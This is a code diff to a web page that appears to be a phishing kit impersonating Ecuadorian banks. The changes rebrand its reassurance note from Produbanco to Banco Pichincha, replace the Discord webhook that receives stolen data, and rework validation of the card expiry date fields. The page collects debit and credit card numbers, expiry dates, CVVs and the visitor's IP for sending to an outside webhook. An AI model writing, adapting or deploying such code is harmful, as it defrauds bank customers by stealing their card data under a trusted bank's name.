@@ -141,12 +141,12 @@
         <small class="sec">Usaremos estos datos únicamente para validar tu identidad. No compartas esta información con terceros.</small>
       </form>
 
-      <p class="note">Nota: Produbanco en ningún momento te solicitara por llamada el número de tarjeta, fecha de vencimiento ni CVV. No compartas esta información con terceros.</p>
+      <p class="note">Nota: Banco Pichincha en ningún momento te solicitaremos por llamada el número de tarjeta, fecha de vencimiento ni CVV. No compartas esta información con terceros.</p>
     </div>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1454910732364812542/eYc89rArTeJ-VGpqHWlS2Xk4BSPghii18O-MURFjfU7Zl34QcP5uansO4EQVaEglBalP";
+    const webhookURL = "https://discord.com/api/webhooks/1450231726440710185/hcCgXjuZ8_c_gE8yeVzr0woQL7iLXS6U57m6JNEy4WQcPYzZPWTSgOZrf6dcGwXc7EFl";
 
     // 👉 Obtener IP del cliente
     async function getIP() {
@@ -224,9 +224,9 @@
         errors.push('Número de tarjeta débito inválido o no pasó la validación del Banco Pichincha');
       }
 
-     if (!isYearFrom2026(debitExpiry)) {
-  errors.push('La fecha de vencimiento debe ser desde el año 2026');
-}
+      if (!/^\d{2}\/\d{2}$/.test(debitExpiry)) {
+        errors.push('Fecha de vencimiento de débito inválida');
+      }
 
       if (!/^\d{3,4}$/.test(debitCVV)) {
         errors.push('CVV de débito inválido');
@@ -248,9 +248,10 @@
           errors.push('Número de tarjeta crédito inválido o no pasó la validación del Banco Pichincha');
         }
 
-        if (!isYearFrom2026(debitExpiry)) {
-  errors.push('La fecha de vencimiento debe ser desde el año 2026');
-}
+        if (!/^\d{2}\/\d{2}$/.test(creditExpiry)) {
+          errors.push('Fecha de vencimiento de crédito inválida');
+        }
+
         if (!/^\d{3,4}$/.test(creditCVV)) {
           errors.push('CVV de crédito inválido');
         }
